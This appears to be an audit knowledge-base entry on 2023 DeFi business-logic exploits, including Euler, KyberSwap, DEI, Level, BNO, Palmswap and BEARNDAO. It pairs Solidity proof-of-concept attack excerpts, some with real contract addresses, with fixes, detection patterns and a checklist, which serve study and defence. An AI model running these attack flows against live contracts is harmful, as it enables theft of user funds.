---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, bsc, polygon"
category: "business_logic"
vulnerability_type: "donate_self_liquidation, duplicate_array_claim, emergency_withdraw_logic, liquidity_calculation_error, unprotected_burn_transfer, convertDust_manipulation"

# Attack Vector Details
attack_type: "logical_error"
affected_component: "lending_protocol, referral_system, staking_pool, amm_liquidity, token_pair, yield_strategy"

# Technical Primitives
primitives:
  - "donateToReserves"
  - "self_liquidation"
  - "duplicate_epoch_claim"
  - "claimMultiple"
  - "emergencyWithdraw"
  - "stakeNft_unstakeNft"
  - "burnFrom_transferFrom"
  - "sync_manipulation"
  - "tick_boundary_error"
  - "convertDustToEarned"
  - "flash_loan_liquidity"
  - "bad_debt_creation"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.85
financial_impact: "critical"

# Context Tags
tags:
  - "defi"
  - "business_logic"
  - "lending"
  - "euler"
  - "kyberswap"
  - "dei"
  - "level_finance"
  - "platypus"
  - "pawnfi"
  - "bearndao"
  - "bno"
  - "donate"
  - "self-liquidation"
  - "duplicate_claim"
  - "emergency_withdraw"
  - "burnFrom"
  - "tick_boundary"
  - "flash_loan"
  - "bad_debt"
  - "real_exploit"
  - "DeFiHackLabs"
  - "2023"

# Version Info
language: "solidity"
version: ">=0.8.0"

# Source
source: DeFiHackLabs
total_exploits_analyzed: 9
total_losses: "$268M+"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [EULER-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-03/Euler_exp.sol` |
| [KYBER-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-11/KyberSwap_exp.eth.1.sol` |
| [DEI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-05/DEI_exp.sol` |
| [LEVEL-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-05/Level_exp.sol` |
| [PLATYPUS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-02/Platypus_exp.sol` |
| [PLATYPUS2-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-07/Platypus02_exp.sol` |
| [PLATYPUS3-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-10/Platypus03_exp.sol` |
| [PAWNFI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-06/Pawnfi_exp.sol` |
| [BNO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-07/BNO_exp.sol` |
| [BEARNDAO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-12/BEARNDAO_exp.sol` |
| [PALMSWAP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-07/Palmswap_exp.sol` |

---

# Business Logic Attack Patterns (2023)

## Overview

2023 saw increasingly sophisticated business logic exploits targeting fundamental protocol design flaws rather than simple coding errors. The year's biggest exploit — Euler Finance ($200M) — demonstrated a novel donate-to-reserves + self-liquidation attack that bypassed all solvency checks. KyberSwap ($48M) exploited a tick boundary precision error in concentrated liquidity calculations. Smaller but systemic patterns included duplicate array element abuse (Level $1M), unprotected burn/transfer functions (DEI $5.4M), emergency withdraw logic flaws (BNO $505K), and flash-loan-driven liquidity manipulation (Palmswap $900K, Platypus $10.5M total across 3 exploits). Combined 2023 business logic losses exceed **$268M**.

---

## 1. Donate-to-Reserves Self-Liquidation (Euler $200M)

### Root Cause

Euler's `donateToReserves()` function allowed a borrower to donate their own eTokens (collateral tokens) to the protocol reserves. This reduced the borrower's collateral below their debt, making them self-liquidatable. Since self-liquidation with a discounted rate yielded more collateral back than the debt owed, the attacker could extract a net profit from each cycle. The protocol had no check preventing a user from donating collateral that was backing active debt.

### Attack Scenario

1. Flash loan 30M DAI from Aave
2. Deploy two contracts: `violator` (the indebted account) and `liquidator`
3. Deposit 20M DAI into Euler → receive 19.5M eDAI
4. Use `mint()` to borrow 200M dDAI debt (10x leverage was allowed)
5. Repay 10M DAI of debt
6. Mint another 200M dDAI
7. Donate 100M eDAI to reserves via `donateToReserves()` — collateral drops below debt
8. Liquidator contract calls `liquidate()` on the violator at a discount
9. Liquidator receives 310M eDAI while absorbing only 259M dDAI
10. Withdraw all remaining DAI — net profit ~$8.8M per token (repeated across DAI, USDC, WETH, wstETH)

### Vulnerable Pattern Examples

**Example 1: Euler Finance — donateToReserves() Self-Liquidation ($200M, Mar 2023)** [CRITICAL] `@audit` [EULER-POC]

```solidity
// ❌ VULNERABLE: donateToReserves() allows borrower to destroy own collateral
// No check: "is the donor currently backing active debt with these eTokens?"

contract Iviolator {
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function violator() external {
        DAI.approve(Euler_Protocol, type(uint256).max);

        // Step 1: Deposit 20M DAI as collateral
        eDAI.deposit(0, 20_000_000 * 1e18);

        // Step 2: Borrow 10x leverage — creates 200M eDAI + 200M dDAI
        eDAI.mint(0, 200_000_000 * 1e18);

        // Step 3: Repay partial debt
        dDAI.repay(0, 10_000_000 * 1e18);

        // Step 4: Mint again — more debt + collateral
        eDAI.mint(0, 200_000_000 * 1e18);

        // Step 5: THE EXPLOIT — donate collateral to reserves
        eDAI.donateToReserves(0, 100_000_000 * 1e18);
        // @audit donateToReserves() does NOT check if donated eTokens back active debt
        // @audit Violator's collateral is now < debt → becomes liquidatable
        // @audit But self-liquidation at discount yields net profit
    }
}

contract Iliquidator {
    function liquidate(address liquidator, address violator) external {
        // @audit Liquidate the self-underwater violator at a discount
        IEuler.LiquidationOpportunity memory returnData =
            Euler.checkLiquidation(liquidator, violator, address(DAI), address(DAI));

        Euler.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);
        // @audit Receives 310M eDAI while absorbing only 259M dDAI
        // @audit Net gain: 310M - 259M = 51M eDAI surplus

        eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));
        // @audit Withdraw all remaining DAI from Euler protocol
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}
// @audit Total: ~$200M stolen across DAI, USDC, WETH, wstETH pools
// @audit Root cause: donateToReserves() doesn't enforce solvency invariant
```

---

## 2. Tick Boundary Precision Error (KyberSwap $48M)

### Root Cause

KyberSwap's concentrated liquidity AMM (Elastic) had a precision error in the `computeSwapStep()` function when calculating at tick boundaries. When a swap moved the price exactly to a tick boundary, rounding errors caused the pool to believe liquidity existed in a range where it had been fully consumed. The attacker exploited this by providing a tiny liquidity position at a specific tick, then swapping to the boundary where the precision error amplified their share, extracting far more tokens than deposited.

### Attack Scenario

1. Flash loan tokens from Aave
2. Swap to move pool price into a zero-liquidity tick range
3. Mint a concentrated liquidity position at a specific tick boundary
4. Swap in the reverse direction to exactly hit the tick boundary
5. Precision error in `computeSwapStep()` causes the pool to use wrong `sqrtP` value
6. This makes the attacker's small position appear to control massive liquidity
7. Remove liquidity — extract far more tokens than deposited

### Vulnerable Pattern Examples

**Example 2: KyberSwap Elastic — Tick Boundary Precision Loss ($48M, Nov 2023)** [CRITICAL] `@audit` [KYBER-POC]

```solidity
// ❌ VULNERABLE: computeSwapStep() precision error at tick boundaries
// When swap lands exactly on tick boundary, sqrtP rounding error amplifies position value

constructor(address victim, address lender, uint256 amount) {
    _attacker = address(this);
    _victim = victim;
    _lender = lender;
    _token0 = address(IKyberswapPool(_victim).token0());
    _token1 = address(IKyberswapPool(_victim).token1());
    _amount = amount;
}

function _flashCallback(uint256 due) internal returns (bool) {
    // Step 1: Swap to move price into zero-liquidity tick range
    IKyberswapPool(_victim).swap(
        _attacker,
        int256(_amount),
        false,                    // zeroForOne = false
        0x100000000000000000000000000,  // move price up dramatically
        ""
    );
    // @audit Pool is now at a tick with zero existing liquidity

    // Step 2: Mint tiny concentrated liquidity position at specific tick
    (,,__nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
    (__token_id,,,) = IKyberswapPositionManager(_manager).mint(
        IKyberswapPositionManager.MintParams(
            _token0, _token1, __swap_fee,
            __nearestCurrentTick, __nearestCurrentTick + 1,
            // @audit Extremely narrow tick range — minimal liquidity provided
            __nearestCurrentTick,
            1,           // @audit Tiny token0 amount
            _amount,     // @audit token1 amount
            0, 0,
            _attacker, _attacker, block.timestamp
        )
    );

    // Step 3: Swap back in opposite direction — hits tick boundary
    IKyberswapPool(_victim).swap(
        _attacker,
        -int256(_amount * 2),
        true,                    // zeroForOne = true
        4295128740,              // near minimum sqrtP
        ""
    );
    // @audit At the tick boundary, computeSwapStep() precision error:
    // @audit Pool uses wrong sqrtP value → attacker's tiny position
    // @audit appears to hold much more liquidity than it actually does

    // Step 4: Remove liquidity — extract amplified amount
    IKyberswapPositionManager(_manager).removeLiquidity(...);
    IKyberswapPositionManager(_manager).burnRTokens(...);
    // @audit Receives far more tokens than deposited — $48M across 77 pools
}
```

---

## 3. Unprotected burnFrom + transferFrom (DEI $5.4M)

### Root Cause

DEI stablecoin's `burnFrom()` function was callable by anyone with zero amount (`burnFrom(pair, 0)`), which inadvertently called `_approve()` with the caller's remaining allowance of 0. This set the pair's allowance for the attacker to 0 — but a separate bug in the approve mechanism allowed the attacker to then call `transferFrom()` to drain the pair's DEI balance. The combination of publicly accessible `burnFrom()` and flawed approval logic created a direct token drain.

### Vulnerable Pattern Examples

**Example 3: DEI Stablecoin — burnFrom() Approval Manipulation ($5.4M, May 2023)** [CRITICAL] `@audit` [DEI-POC]

```solidity
// ❌ VULNERABLE: Public burnFrom() manipulates approvals on the liquidity pair

function testExploit() public {
    DEI.approve(address(pair), type(uint256).max);

    // Step 1: Call burnFrom with amount=0 — manipulates approval state
    DEI.burnFrom(address(pair), 0);
    // @audit burnFrom(pair, 0) triggers _approve() which sets allowance
    // @audit This creates a state where transferFrom succeeds unexpectedly

    // Step 2: Drain DEI from the pair using manipulated approval
    DEI.transferFrom(
        address(pair),          // @audit FROM: the liquidity pair contract
        address(this),          // @audit TO: attacker
        DEI.balanceOf(address(pair)) - 1  // @audit AMOUNT: almost all DEI in pair
    );
    // @audit Attacker now holds the pair's entire DEI reserve

    // Step 3: Sync pair reserves to reflect the drain
    pair.sync();

    // Step 4: Swap manipulated pair for USDC
    DEI.transfer(address(pair), DEI.balanceOf(address(this)));
    pair.swap(0, 5_047_470_472_572, address(this), "");
    // @audit ~$5M USDC extracted through manipulated DEI/USDC pair
}
// @audit Root cause: burnFrom() is publicly callable and manipulates approval state
// @audit No access control on burn, no check that amount > 0 for approval side-effects
```

---

## 4. Duplicate Array Elements in Reward Claiming (Level $1M)

### Root Cause

Level Finance's `LevelReferralControllerV2.claimMultiple()` function accepted an array of epoch IDs to claim rewards for, but did not check for duplicate elements. An attacker could submit the same epoch ID hundreds of times in a single `claimMultiple()` call, claiming the same reward repeatedly.

### Attack Scenario

1. Set up referral network (attacker → exploiter → referrals)
2. Perform wash trading to generate referral points
3. Trigger epoch advancement
4. Call `claimMultiple()` with an array of 2000 identical epoch IDs
5. Receive 2000x the legitimate reward amount

### Vulnerable Pattern Examples

**Example 4: Level Finance — Duplicate Epoch Array in claimMultiple() ($1M, May 2023)** [CRITICAL] `@audit` [LEVEL-POC]

```solidity
// ❌ VULNERABLE: claimMultiple() does not check for duplicate epoch IDs
// Same epoch can be claimed repeatedly in a single transaction

function claimReward(uint256 amount) internal {
    uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
    uint256[] memory _epoches = new uint256[](amount);

    // @audit Fill array with 2000 IDENTICAL epoch IDs
    for (uint256 i; i < amount; i++) {
        _epoches[i] = tokenID;  // @audit Same tokenID every iteration!
    }

    LevelReferralControllerV2.claimable(_epoches[0], address(this));

    LevelReferralControllerV2.claimMultiple(_epoches, address(this));
    // @audit claimMultiple iterates the array and pays out for each element
    // @audit No deduplication: 2000 entries = 2000x reward payout
    // @audit ~$1M in LVL tokens stolen through repeated claims

    exploiter.claimMultiple(amount);
    // @audit Exploiter contract also claims with same duplicate array
}

// Facilitating wash trading to generate referral points:
function DPPFlashLoanCall(...) external {
    for (uint256 i; i < amount; i++) {
        WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
        pool.swap(address(WBNB), address(USDT), 1, address(this),
            abi.encode(address(exploiter)));
        // @audit Each swap generates referral points for the exploiter
        USDT.transfer(address(pool), USDT.balanceOf(address(this)));
        pool.swap(address(USDT), address(WBNB), 1, address(this),
            abi.encode(address(exploiter)));
    }
}
// @audit Root cause: Missing duplicate detection in batch claim arrays
// @audit Fix: Track claimed epochs in mapping: mapping(address => mapping(uint256 => bool))
```

---

## 5. Emergency Withdraw Without NFT Unstake (BNO $505K)

### Root Cause

BNO's staking pool had an `emergencyWithdraw()` function that reset a user's staked token balance but did not reclaim or lock the staked NFTs. After calling `emergencyWithdraw()`, the user could still call `unstakeNft()` to retrieve NFTs that should have been forfeited during the emergency exit. By repeating the cycle (stake NFTs → pledge tokens → emergency withdraw → unstake NFTs), the attacker extracted tokens each iteration.

### Vulnerable Pattern Examples

**Example 5: BNO Protocol — emergencyWithdraw() Logic Gap ($505K, Jul 2023)** [HIGH] `@audit` [BNO-POC]

```solidity
// ❌ VULNERABLE: emergencyWithdraw() resets token balance but doesn't lock/burn NFTs
// User can unstake NFTs after emergency withdrawal

function callEmergencyWithdraw() internal {
    NFT.approve(address(Pool), 13);
    NFT.approve(address(Pool), 14);

    uint256[] memory tokenIds = new uint256[](2);
    tokenIds[0] = 13;
    tokenIds[1] = 14;

    // Step 1: Stake NFTs into the pool
    Pool.stakeNft{value: 0.008 ether}(tokenIds);

    // Step 2: Pledge (stake) BNO tokens
    Pool.pledge{value: 0.008 ether}(BNO.balanceOf(address(this)));

    // Step 3: Emergency withdraw — returns staked BNO tokens
    Pool.emergencyWithdraw();
    // @audit Token balance reset to 0, BNO tokens returned
    // @audit BUT: NFT stake status is NOT reset

    // Step 4: Unstake NFTs — still works after emergency withdraw!
    Pool.unstakeNft{value: 0.008 ether}(tokenIds);
    // @audit NFTs returned despite emergency exit
    // @audit Net result: attacker gets back BNO tokens + NFTs each cycle
}

// Exploit loop: repeat 100 times in single transaction
function pancakeCall(...) external {
    BNO.approve(address(Pool), type(uint256).max);
    for (uint256 i; i < 100; i++) {
        callEmergencyWithdraw();
        // @audit Each iteration: stake → pledge → emergency exit → unstake
        // @audit Each cycle extracts BNO tokens from the pool
    }
    BNO.transfer(address(PancakePair), 296_077 * 1e18);
    // @audit Repay flash loan, keep profit: ~$505K
}
// @audit Root cause: emergencyWithdraw() doesn't synchronize NFT stake state
// @audit Fix: emergencyWithdraw() must also unstake/lock NFTs
```

---

## 6. Flash Loan Liquidity Manipulation (Palmswap $900K)

### Root Cause

Palmswap's liquidity event contract allowed users to purchase PLP tokens at a 1:1 ratio with USDP, but the withdrawal ratio was calculated based on the pool's current USDP reserves. By depositing a large amount of BUSDT into the vault (inflating the USDP supply), the attacker changed the withdrawal exchange rate from 1:1 to 1:1.9, extracting 90% more tokens than deposited.

### Vulnerable Pattern Examples

**Example 6: Palmswap — Exchange Rate Manipulation via Vault Deposit ($900K, Jul 2023)** [HIGH] `@audit` [PALMSWAP-POC]

```solidity
// ❌ VULNERABLE: Withdrawal exchange rate depends on current vault reserves
// Flash loan deposit inflates reserves → better withdrawal rate

function executeOperation(...) external returns (bool) {
    // Step 1: Purchase PLP at 1:1 rate
    uint256 amountOut = LiquidityEvent.purchasePlp(
        1_000_000 * 1e18,  // 1M BUSDT
        0,                  // min USDP
        0                   // min PLP
    );
    // @audit Exchange rate: 1 BUSDT → 1 USDP → 1 PLP

    // Step 2: Deposit extra BUSDT into vault — inflates USDP reserves
    BUSDT.transfer(address(Vault), 2_000_000 * 1e18);
    Vault.buyUSDP(address(this));
    // @audit Vault now has 3M USDP instead of 1M
    // @audit This changes the PLP redemption exchange rate

    // Step 3: Redeem PLP — now at 1:1.9 rate instead of 1:1
    uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(
        amountOut - 13_294 * 1e15,
        0,
        address(this)
    );
    // @audit Receives 1.9M USDP for 1M PLP deposited
    // @audit 90% profit from exchange rate manipulation

    // Step 4: Convert USDP back to BUSDT
    USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);
    Vault.sellUSDP(address(this));
    // @audit Net profit: ~$900K after flash loan repayment
    return true;
}
// @audit Root cause: Withdrawal rate uses spot reserve ratios (manipulable)
// @audit Fix: Use TWAP for exchange rate or lock deposits for minimum duration
```

---

## 7. convertDustToEarned Price Manipulation (BEARNDAO $769K)

### Root Cause

BEARNDAO's Bvaults strategy had a public `convertDustToEarned()` function that swapped residual "dust" tokens to the earned token via a DEX. An attacker could front-run this call by first buying the earned token (ALPACA), then triggering `convertDustToEarned()` which would swap WBNB→ALPACA on the same DEX at an inflated price, and finally selling ALPACA back at profit.

### Vulnerable Pattern Examples

**Example 7: BEARNDAO — Public convertDustToEarned() Sandwich ($769K, Dec 2023)** [HIGH] `@audit` [BEARNDAO-POC]

```solidity
// ❌ VULNERABLE: Public convertDustToEarned() allows sandwich attack
// Anyone can trigger the swap, and flash loan manipulation captures the slippage

function pancakeCall(...) external {
    WBNB.approve(address(Router), type(uint256).max);
    ALPACA.approve(address(Router), type(uint256).max);

    // Step 1: Buy ALPACA with flash-loaned WBNB — inflate ALPACA price
    WBNB_ALPACA();
    // @audit Now ALPACA/WBNB price is inflated on the DEX

    // Step 2: Trigger the vulnerable public function
    BvaultsStrategy.convertDustToEarned();
    // @audit Strategy swaps its WBNB dust → ALPACA at inflated price
    // @audit Strategy receives fewer ALPACA tokens than fair value
    // @audit This pushes ALPACA price even higher

    // Step 3: Sell ALPACA back at profit
    ALPACA_WBNB();
    WBNB_BUSD();
    // @audit Attacker profits from the price impact of strategy's swap
    // @audit ~$769K profit after flash loan repayment
}

// @audit Root cause: Public function performs DEX swap without slippage protection
// @audit Fix: 1) Add access control to convertDustToEarned()
// @audit Fix: 2) Use oracle-based slippage protection for swaps
// @audit Fix: 3) Use private mempool / commit-reveal for sensitive swaps
```

---

## 8. Flash Loan Bad Debt Creation (Platypus $10.5M Total, 3 Exploits)

### Root Cause

Platypus Finance's lending system allowed users to borrow the protocol's stablecoin (USP) against staked LP tokens. The protocol did not properly account for flash-loan-inflated positions during the borrowing step, and the `emergencyWithdraw()` function could be called even when debt was outstanding, leaving bad debt in the system.

### Vulnerable Pattern Examples

**Example 8: Platypus Finance — Flash Loan + Emergency Withdraw Bad Debt ($8.5M+$51K+$2M, Feb/Jul/Oct 2023)** [CRITICAL] `@audit` [PLATYPUS-POC]

```solidity
// ❌ VULNERABLE: Borrow → emergencyWithdraw creates unrecoverable bad debt
// Flash loan enables massive temporary position for maximum extraction

// Attack flow (simplified from Platypus PoC):
// 1. Flash loan 44M USDC from AAVE
// 2. Deposit USDC into Platypus pool → receive LP tokens
// 3. Stake LP tokens in MasterPlatypusV4
// 4. Borrow maximum USP against staked position
// 5. Call emergencyWithdraw() — retrieves LP tokens WITHOUT repaying USP
// 6. Unstake LP → withdraw USDC → repay flash loan
// 7. Keep the borrowed USP

// @audit Three separate exploits using the same core vulnerability:
// @audit Feb 2023: $8.5M — original exploit
// @audit Jul 2023: $51K — partial patch bypassed
// @audit Oct 2023: $2M — additional pools exploited
// @audit Root cause: emergencyWithdraw() doesn't check or clear outstanding debt
// @audit Fix: emergencyWithdraw() must require debt == 0 before allowing withdrawal
```

---

## Secure Implementations

### Pattern 1: Donation with Solvency Check
```solidity
// ✅ SECURE: Check solvency AFTER donation
function donateToReserves(uint256 subAccountId, uint256 amount) external {
    _burnETokens(msg.sender, subAccountId, amount);
    reserves += amount;

    // @audit CRITICAL: Verify donor remains solvent after donation
    require(
        _checkLiquidity(msg.sender, subAccountId),
        "DONATION_WOULD_CREATE_INSOLVENCY"
    );
}
```

### Pattern 2: Deduplicated Batch Claims
```solidity
// ✅ SECURE: Track claimed epochs to prevent duplicate claims
mapping(address => mapping(uint256 => bool)) public claimed;

function claimMultiple(uint256[] calldata epochs, address to) external {
    for (uint256 i = 0; i < epochs.length; i++) {
        require(!claimed[msg.sender][epochs[i]], "ALREADY_CLAIMED");
        claimed[msg.sender][epochs[i]] = true;
        _processClaim(epochs[i], to);
    }
}
```

### Pattern 3: Synchronized Emergency Withdraw
```solidity
// ✅ SECURE: Emergency withdraw handles all state including NFTs and debt
function emergencyWithdraw() external {
    UserInfo storage user = userInfo[msg.sender];
    require(user.debt == 0, "OUTSTANDING_DEBT");

    // Return staked tokens
    uint256 amount = user.amount;
    user.amount = 0;
    user.rewardDebt = 0;

    // Also unstake and return any NFTs
    uint256[] memory nftIds = userNfts[msg.sender];
    for (uint256 i = 0; i < nftIds.length; i++) {
        nft.transferFrom(address(this), msg.sender, nftIds[i]);
    }
    delete userNfts[msg.sender];

    stakingToken.safeTransfer(msg.sender, amount);
}
```

---

## Impact Analysis

| Pattern | Frequency | Combined Losses | Severity |
|---------|-----------|----------------|----------|
| Donate + Self-Liquidate | 1/9 reports | $200M | CRITICAL |
| Tick Boundary Precision | 1/9 reports | $48M | CRITICAL |
| Flash Loan Bad Debt | 3/9 reports | $10.5M | CRITICAL |
| Unprotected burn/transfer | 1/9 reports | $5.4M | CRITICAL |
| Duplicate Array Claims | 1/9 reports | $1M | HIGH |
| Exchange Rate Manipulation | 1/9 reports | $900K | HIGH |
| APE Staking Logic Flaw | 1/9 reports | $820K | HIGH |
| convertDust Sandwich | 1/9 reports | $769K | HIGH |
| Emergency Withdraw Gap | 1/9 reports | $505K | HIGH |

---

## Detection Patterns

### Static Analysis
```
// Detect donateToReserves without solvency check
pattern: function.*donate.*reserves.*{[^}]*}
anti-pattern: require.*liquidity|require.*solvent

// Detect batch claim without deduplication
pattern: function.*claimMultiple.*\[\].*{
anti-pattern: claimed\[.*\]\[.*\]|mapping.*claimed

// Detect emergencyWithdraw without debt check
pattern: function.*emergencyWithdraw.*{
anti-pattern: require.*debt.*==.*0|debt.*>.*0
```

### Dynamic Testing
```
// Test: Can the same array element be claimed twice?
uint256[] memory ids = new uint256[](2);
ids[0] = 1; ids[1] = 1;  // duplicate!
protocol.claimMultiple(ids, attacker);

// Test: Can emergencyWithdraw be called with outstanding debt?
protocol.borrow(amount);
protocol.emergencyWithdraw(); // should revert

// Test: Does donateToReserves check solvency?
protocol.deposit(collateral);
protocol.borrow(maxDebt);
protocol.donateToReserves(collateral); // should revert
```

---

## Audit Checklist

- [ ] Does `donateToReserves()` or similar functions check solvency after operation?
- [ ] Do batch claim functions deduplicate input arrays?
- [ ] Does `emergencyWithdraw()` check for outstanding debt?
- [ ] Does `emergencyWithdraw()` properly handle all staked assets (tokens, NFTs)?
- [ ] Are exchange rates based on TWAP/oracles rather than spot reserves?
- [ ] Are public swap functions (like `convertDustToEarned()`) access-controlled?
- [ ] Can `burnFrom()` be called by anyone? Does it have approval side-effects?
- [ ] Are concentrated liquidity tick boundary calculations verified for precision?
- [ ] Do flash loan interactions preserve protocol invariants?

---

## Real-World Examples

| Protocol | Date | Loss | Chain | Root Cause | PoC |
|----------|------|------|-------|------------|-----|
| Euler Finance | Mar 2023 | $200M | ETH | donateToReserves self-liquidation | [EULER-POC] |
| KyberSwap | Nov 2023 | $48M | ETH/ARB/POLY/AVAX/OP | Tick boundary precision error | [KYBER-POC] |
| Platypus (3x) | Feb/Jul/Oct 2023 | $10.5M | AVAX | Flash loan + emergency withdraw bad debt | [PLATYPUS-POC] |
| DEI | May 2023 | $5.4M | ARB | Public burnFrom approval manipulation | [DEI-POC] |
| Level Finance | May 2023 | $1M | BSC | Duplicate epoch array in claimMultiple | [LEVEL-POC] |
| Palmswap | Jul 2023 | $900K | BSC | Exchange rate via reserve inflation | [PALMSWAP-POC] |
| Pawnfi | Jun 2023 | $820K | ETH | APE staking withdrawal logic flaw | [PAWNFI-POC] |
| BEARNDAO | Dec 2023 | $769K | BSC | Public convertDustToEarned sandwich | [BEARNDAO-POC] |
| BNO | Jul 2023 | $505K | BSC | Emergency withdraw without NFT unstake | [BNO-POC] |

---

## Keywords

business_logic, donate_to_reserves, self_liquidation, euler, kyberswap, tick_boundary, precision_error, concentrated_liquidity, claimMultiple, duplicate_array, batch_claim, emergency_withdraw, bad_debt, burnFrom, transferFrom, approval_manipulation, exchange_rate, flash_loan, convertDust, sandwich, NFT_staking, solvency_check, platypus, DEI, level_finance, palmswap, pawnfi, bearndao, bno, 2023, DeFiHackLabs
